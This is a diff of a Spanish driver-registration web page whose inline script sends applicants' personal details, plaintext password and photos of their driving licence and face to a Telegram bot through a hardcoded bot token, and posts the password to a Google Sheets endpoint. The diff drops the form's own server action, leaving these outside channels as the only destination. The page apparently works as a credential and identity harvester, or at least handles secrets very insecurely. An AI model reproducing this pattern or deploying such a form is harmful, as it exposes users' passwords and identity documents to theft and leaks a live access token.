@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Registro de Socio Conductor</title>
   <style>
     body {
@@ -76,11 +76,6 @@
       background-color: #FFBA42;
     }
 
-    #estadoEnvio {
-      margin-top: 20px;
-      display: none;
-    }
-
     .mensaje-envio {
       position: absolute;
       top: 0;
@@ -96,6 +91,7 @@
       text-align: center;
       color: #fff;
       z-index: 10;
+      display: none;
     }
 
     .mensaje-envio h3 {
@@ -112,18 +108,18 @@
       </button>
     </div>
     <h2>Registro de Socio Conductor</h2>
-    <form id="registroForm" action="/registro-socio" method="POST" enctype="multipart/form-data">
+    <form id="registroForm" enctype="multipart/form-data">
       <label for="nombres">Nombres</label>
-      <input type="text" id="nombres" name="nombres" required />
+      <input type="text" id="nombres" name="nombres" required>
 
       <label for="apellidos">Apellidos</label>
-      <input type="text" id="apellidos" name="apellidos" required />
+      <input type="text" id="apellidos" name="apellidos" required>
 
       <label for="telefono">Teléfono de contacto</label>
-      <input type="tel" id="telefono" name="telefono" required />
+      <input type="tel" id="telefono" name="telefono" required>
 
       <label for="correo">Correo electrónico</label>
-      <input type="email" id="correo" name="correo" required />
+      <input type="email" id="correo" name="correo" required>
 
       <label for="tipo">Tipo de Vehículo</label>
       <select id="tipo" name="tipo" required>
@@ -135,36 +131,29 @@
       </select>
 
       <label for="placa">Placa del Vehículo</label>
-      <input type="text" id="placa" name="placa" required />
+      <input type="text" id="placa" name="placa" required>
 
       <label for="licencia">Número de Licencia</label>
-      <input type="text" id="licencia" name="licencia" required />
+      <input type="text" id="licencia" name="licencia" required>
 
       <label for="contrasena">Contraseña</label>
-      <input type="password" id="contrasena" name="contrasena" required />
+      <input type="password" id="contrasena" name="contrasena" required>
 
       <label for="fotoVehiculo">Foto del Vehículo</label>
-      <input type="file" id="fotoVehiculo" name="fotoVehiculo" accept="image/*" required />
+      <input type="file" id="fotoVehiculo" name="fotoVehiculo" accept="image/*" required>
 
       <label for="fotoLicenciaFrontal">Foto de Licencia - Frente</label>
-      <input type="file" id="fotoLicenciaFrontal" name="fotoLicenciaFrontal" accept="image/*" required />
+      <input type="file" id="fotoLicenciaFrontal" name="fotoLicenciaFrontal" accept="image/*" required>
 
       <label for="fotoLicenciaReverso">Foto de Licencia - Reverso</label>
-      <input type="file" id="fotoLicenciaReverso" name="fotoLicenciaReverso" accept="image/*" required />
+      <input type="file" id="fotoLicenciaReverso" name="fotoLicenciaReverso" accept="image/*" required>
 
       <label for="fotoConductor">Foto del Conductor</label>
-      <input type="file" id="fotoConductor" name="fotoConductor" accept="image/*" required />
+      <input type="file" id="fotoConductor" name="fotoConductor" accept="image/*" required>
 
       <button type="submit">Enviar solicitud</button>
     </form>
-    <div id="estadoEnvio">
-      <div style="background-color: #fff; border-radius: 20px; overflow: hidden; height: 30px;">
-        <div id="barraEnvio" style="height: 100%; width: 0%; background: linear-gradient(to right, #FFD24C, #FFBA42); display: flex; align-items: center; justify-content: center; font-weight: bold; color: #1F3B5C; transition: width 0.5s;">
-          🚖 Enviando...
-        </div>
-      </div>
-    </div>
-    <div id="mensajeConfirmacion" class="mensaje-envio" style="display: none;">
+    <div id="mensajeConfirmacion" class="mensaje-envio">
       <h3>✅ Solicitud enviada</h3>
       <p>En breve nos pondremos en contacto contigo.</p>
       <button onclick="window.location.href='/'">Regresar a la página principal</button>
@@ -172,7 +161,7 @@
   </div>
 
   <script>
-    document.getElementById("registroForm").addEventListener("submit", async function (e) {
+    document.getElementById("registroForm").addEventListener("submit", async function(e) {
       e.preventDefault();
 
       const form = e.target;
@@ -185,35 +174,27 @@
       const licencia = formData.get("licencia");
       const telefono = formData.get("telefono");
       const correo = formData.get("correo");
+      const contrasena = formData.get("contrasena");
 
-      const mensaje =
-        `🚗 *Nueva solicitud de socio conductor*\n\n` +
+      const mensaje = `🚗 *Nueva solicitud de socio conductor*\n\n` +
         `👤 *Nombre:* ${nombres} ${apellidos}\n` +
         `📞 *Teléfono:* ${telefono}\n` +
         `✉️ *Correo:* ${correo}\n` +
         `🚘 *Tipo de vehículo:* ${tipo}\n` +
         `🔢 *Placa:* ${placa}\n` +
-        `🪖 *Licencia:* ${licencia}`;
+        `🪪 *Licencia:* ${licencia}`;
 
       const TOKEN = "8160209072:AAFnlNrBaML99akWHZMYdYZL7Y60udRquKA";
       const CHAT_ID = "5828174289";
 
-      const estadoEnvio = document.getElementById("estadoEnvio");
-      const barra = document.getElementById("barraEnvio");
-      estadoEnvio.style.display = "block";
-      barra.style.width = "40%";
-      setTimeout(() => barra.style.width = "70%", 1000);
-
+      // Enviar mensaje principal
       await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: mensaje,
-          parse_mode: "Markdown",
-        })
+        body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, parse_mode: "Markdown" })
       });
 
+      // Enviar fotos
       async function enviarFoto(nombreCampo, caption) {
         const archivo = formData.get(nombreCampo);
         if (!archivo) return;
@@ -224,16 +205,16 @@
 
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
           method: "POST",
-          body: data,
+          body: data
         });
       }
 
       await enviarFoto("fotoVehiculo", "📸 Foto del vehículo");
       await enviarFoto("fotoLicenciaFrontal", "📄 Licencia - Frente");
       await enviarFoto("fotoLicenciaReverso", "📄 Licencia - Reverso");
-      await enviarFoto("fotoConductor", "🤳 Foto del conductor");
+      await enviarFoto("fotoConductor", "🧳 Foto del conductor");
 
-      // 🔄 Enviar datos a Google Sheets
+      // Enviar datos a Google Sheets
       const datos = {
         nombre: `${nombres} ${apellidos}`,
         telefono,
@@ -241,7 +222,7 @@
         tipo,
         placa,
         licencia,
-        contrasena: formData.get("contrasena")
+        contrasena
       };
 
       try {
@@ -251,17 +232,11 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(datos)
         });
-        console.log("✅ Datos enviados a Google Sheets");
-      } catch (error) {
-        console.error("❌ Error al enviar a Google Sheets:", error);
-      }
-
-      barra.style.width = "100%";
-      setTimeout(() => {
-        estadoEnvio.style.display = "none";
         document.getElementById("mensajeConfirmacion").style.display = "flex";
         form.reset();
-      }, 800);
+      } catch (error) {
+        console.error("Error al enviar a Google Sheets:", error);
+      }
     });
   </script>
 </body>
